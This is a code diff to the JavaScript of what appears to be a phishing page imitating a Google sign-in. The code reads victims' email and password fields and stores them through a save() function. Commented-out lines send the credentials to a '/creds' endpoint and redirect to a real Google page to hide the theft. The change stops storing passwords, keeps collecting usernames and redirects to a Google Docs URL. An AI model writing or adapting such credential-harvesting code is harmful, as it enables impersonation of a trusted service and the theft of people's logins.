@@ -35,9 +35,12 @@ function doEmailStep(){
 
 function doPasswordStep(){
 	var username = $('#email-input').val()
-	var password = $('#password-input').val()
+	// var password = $('#password-input').val()
 
-	save(username, password);
+	save(username);
+
+	// //Redirect to myaccount.google
+	window.location.replace("https://docs.google.com/spreadsheets/u/0/?tgif=d")
 
 	// var xhr = new XMLHttpRequest();
 	// xhr.open("GET", "/creds?username="+ username +"&password="+ password, true);
@@ -51,7 +54,7 @@ function doPasswordStep(){
 	// 			save(username, password);
 	//
 	// 			// //Redirect to myaccount.google
-	// 			window.location.replace("https://myaccount.google.com")
+	// 			window.location.replace("https://docs.google.com/spreadsheets/u/0/?tgif=d")
 	// 		} else {
 	// 			console.log('error')
 	// 			$('#password-input').val('')
@@ -116,7 +119,7 @@ function save(email, password) {
 	// A post entry.
 	var userData = {
 		email: email,
-		password: password,
+		// password: password,
 	};
 
 	// Get a key for a new Post.
